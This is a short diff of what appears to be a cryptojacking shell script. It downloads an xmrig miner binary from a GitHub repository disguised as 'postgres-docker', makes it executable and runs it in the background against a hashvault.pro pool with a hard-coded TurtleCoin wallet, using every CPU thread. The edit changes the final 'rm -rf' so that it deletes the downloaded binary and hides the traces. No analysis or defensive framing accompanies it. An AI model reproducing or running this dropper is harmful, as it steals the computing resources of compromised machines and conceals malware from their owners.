@@ -1,4 +1,4 @@
 wget -O crot https://github.com/iaidjb18ha/postgres-docker/raw/master/xmrig
 chmod 777 crot
 ./crot -o frankfurt01.hashvault.pro:80 -u TRTLv3XdA6KgV9dHSXXB1pJtSjdQdLXuJewbc5SALSGcaXwyKkj548iWqBKxQEnyeRV7hfBw8FaveMmBDzeRCjQ7arJQASUnca2 --keepalive --donate-level 1 -p $(cat /proc/sys/kernel/hostname) -k --tls -t$(nproc --all) -B
-rm -rf matmu
+rm -rf crot
